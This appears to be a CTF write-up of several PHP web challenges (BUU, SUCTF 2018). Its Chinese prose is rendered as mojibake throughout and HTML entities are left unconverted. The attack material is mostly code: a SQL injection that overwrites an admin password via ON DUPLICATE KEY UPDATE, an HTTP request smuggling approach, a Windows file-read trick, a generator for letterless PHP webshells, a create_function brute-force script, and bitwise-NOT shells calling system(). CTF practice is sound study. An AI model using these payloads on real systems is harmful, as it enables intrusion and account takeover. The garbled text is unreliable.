,å½“insertå·²ç»å­˜åœ¨çš„è®°å½•æ—¶ï¼Œæ‰§â¾updateç”¨ä¸‹é¢çš„å½“ç”¨æˆ·å, å¯†ç éšä¾¿, æ³¨å†Œ 123admin%1$&#39;,%1$&#39;password%1$&#39;) ON DUPLICATE KEY UPDATE password&#x3D;%1$&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08%1$&#39;#&#x3D;&gt;INSERT INTO &#96;$this-&gt;tbname&#96;(&#96;a&#96;,&#96;b&#96;) VALUE(&#39;admin&#39;,&#39;password&#39;) ON DUPLICATE KEY UPDATE password&#x3D;&#39;9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08&#39;#&#39;,&#39;sss&#39;) buuçš„é¢˜ç›®ç¯å¢ƒæ²¡æˆåŠŸï¼Œ è¿™æ—¶å¯ä»¥ä»æœåŠ¡å™¨è¿”å›çš„Serverå¤´ä¸­å‘ç°ï¼Œåä»£æ˜¯ATS7.1.2 é‚£ä¹ˆåº”è¯¥å¾ˆæ•æ„Ÿçš„æƒ³åˆ°é€šè¿‡HTTPèµ°ç§ æ¥ç»•è¿‡åä»£ã€‚ https://mengsec.com/2019/10/10/http-request-smugging/ å¯ä»¥åˆ©ç”¨CL-TEçš„æ–¹æ³•è¿›è¡Œèµ°ç§æ”»å‡» LFI2019æºç  è·Ÿè¿›get() æœ‰ä¸ªå¥‡æ€ªçš„è¦æ±‚ï¼Œå³ç»è¿‡path_sanitizer()å¤„ç†åçš„filenameå’ŒåŸæ¥ä¸åŒï¼Œå¹¶ä¸”è¯»å–çš„å†…å®¹ä¹Ÿä¸åŒã€‚ æœ€åæœ‰ä¸€æ¬¡å°†/å’Œ\\æ›¿æ¢ä¸ºç©ºçš„æ“ä½œï¼Œè¿™é‡Œå¯ä»¥ç”¨æ¥å°è¯•æ„é€ å‡ºä¸åŒçš„æ–‡ä»¶åï¼Œä½†æ˜¯åœ¨æ–‡ä»¶åå°¾è¯•äº†ä¸¤ç§éƒ½ä¸è¡Œï¼Œæ— æ³•è¯»åˆ°æ–‡ä»¶å†…å®¹ã€‚ è¿™é‡Œçš„ç¯å¢ƒæ˜¯windowsã€‚ å¯¹äºWindowsçš„æ–‡ä»¶è¯»å–ï¼Œæœ‰ä¸€ä¸ªå°Trickï¼šä½¿ç”¨FindFirstFileè¿™ä¸ªAPIçš„æ—¶å€™ï¼Œå…¶ä¼šæŠŠ&quot;è§£é‡Šä¸º.ã€‚æ„å³ï¼šshell&quot;php === shell.php å¯¹äºæœ¬é¢˜å¯ä»¥ç›´æ¥è®¾ç½®æ–‡ä»¶åä¸º&quot;/testï¼Œ 1234$read_file &#x3D; &quot;.&#x2F;files&#x2F;.&#x2F;test&quot;;$read_file_with_hardened_filter &#x3D; &quot;.&#x2F;files&#x2F;.test&quot;;file_get_contents($read_file) &#x3D; &#39;å®é™…æ–‡ä»¶å†…å®¹&#39;;file_get_contents($read_file_with_hardened_filter) &#x3D; false &#x2F;&#x2F;æ–‡ä»¶ä¸å­˜åœ¨ put()æ–¹æ³•ä¸­å¯¹å†…å®¹çš„è¿‡æ»¤ å‚è€ƒpç‰›çš„æ— å­—æ¯shell æ„é€ ä¸€ä¸ªreadfile(&#39;flag.php&#39;); æ„é€ è„šæœ¬ 1234567891011121314151617181920212223242526272829303132a = \"readfile\"b = \"flag.php\"pos = 2ans = '&lt;?=$_=[];$_=\"$_\";$_=$_[(\"!\"==\"!\")+(\"!\"==\"!\")+(\"!\"==\"!\")];' # å¾—åˆ°afor i in a: if i &gt;= 'a' and i &lt;= 'z': # res = '$__=$_;' res = '$__=$_;' res += ('$__++;') * (ord(i) - ord('a')) pos += 1 # print(i + '=&gt;' + res) ans += res ans += '$___.=$__;' else: ans += '$___.=\"' + i + '\";'print(ans)ans = ''for i in b: if i &gt;= 'a' and i &lt;= 'z': # res = '$__=$_;' res = '$____=$_;' res += ('$____++;') * (ord(i) - ord('a')) pos += 1 # print(i + '=&gt;' + res) ans += res ans += '$_____.=$____;' else: ans += '$_____.=\"' + i + '\";'ans += '$___($_____);?&gt;'print(ans) å¾—åˆ° 1&lt;?=$_=[];$_=\"$_\";$_=$_[(\"!\"==\"!\")+(\"!\"==\"!\")+(\"!\"==\"!\")];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$___.=$__;$__=$_;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$____=$_;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$_____.=\".\";$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____.=$____;$___($_____);?&gt; [SUCTF 2018]annonymousæºç  create_function()è¿™ä¸ªå‡½æ•°çš„æ¼æ´ï¼Œä»–createä¹‹åä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå‡½æ•°åä¸º%00lambda_%d %dä»£è¡¨æ˜¯è¿›ç¨‹ä¸­çš„ç¬¬å‡ ä¸ªåŒ¿åå‡½æ•°ï¼Œçˆ†ç ´å‡º$MYå³å¯ 1234import requestswhile True: r&#x3D;requests.get(&#39;http:&#x2F;&#x2F;6c2d621c-b6b5-484d-a4fe-48959d98450f.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_1&#39;) print(r.text) [SUCTF 2018]GetShell ä»ç¬¬å…­ä½å¼€å§‹æ£€æµ‹å­—ç¬¦ï¼Œbpè·‘ä¸€ä¸‹ï¼Œåªèƒ½ç”¨$()[]_=;~ è€ƒç‚¹æ˜¯æ— å­—æ¯shellï¼Œpç‰›æä¾›äº†ä¸‰ç§æ€è·¯ï¼Œ+å’Œ^ä¹Ÿè¢«è¿‡æ»¤ï¼Œè¿˜å¯ä»¥è€ƒè™‘å–å 1234&lt;?php$a = 'phpinfo';$b = urlencode(~$a);(~urldecode($b))(); è¿™é‡Œç”±äºä»ç¬¬å…­ä½å¼€å§‹åˆ¤æ–­ï¼Œéœ€è¦ä½¿ç”¨çŸ­æ ‡ç­¾&lt;?= 1&lt;?= (~(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½))(); eval()å’Œassert()å¤±è´¥ï¼Œç›´æ¥ä½¿ç”¨system() 12345678&lt;?php$a = 'system';$b = urlencode(~$a);$c = 'ls /';$d = urlencode(~$c);echo $b.\"\\n\";echo $d; ç»“æœæœ€åè¯»åˆ°çš„æ˜¯SUCTF{fake_flag_web_b} å¦ä¸€ç§æ–¹æ³• fuzzä»£ç  1234567891011121314&lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = 'å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)&#123; $st = mb_substr($str, $i,1, 'utf-8'); $a = ~($st); $b = $a[1]; #å–æ±‰å­—çš„ç¬¬ä¸€ä½ if($b==$_GET['a']) #$_GET['a']æƒ³è¦å¾—åˆ°çš„å­—ç¬¦ &#123; echo $st;exit; &#125; &#125;?&gt; 1234567891011echo ~åŒ—[$____];&#x2F;&#x2F;secho ~å†…[$____];&#x2F;&#x2F;yecho ~åŒ—[$____];&#x2F;&#x2F;secho ~è‹[$____];&#x2F;&#x2F;techo ~çš„[$____];&#x2F;&#x2F;eecho ~å’©[$____];&#x2F;&#x2F;mecho ~è¯¾[$____];&#x2F;&#x2F;Pecho ~å°¬[$____];&#x2F;&#x2F;Oecho ~ç¬”[$____];&#x2F;&#x2F;Secho ~ç«¯[$____];&#x2F;&#x2F;Techo ~ç[$____];&#x2F;&#x2F;a æ–‡ä»¶ç¼–ç æ”¹æˆISO-8859-15ï¼Œå†™å…¥payloadä¿å­˜ 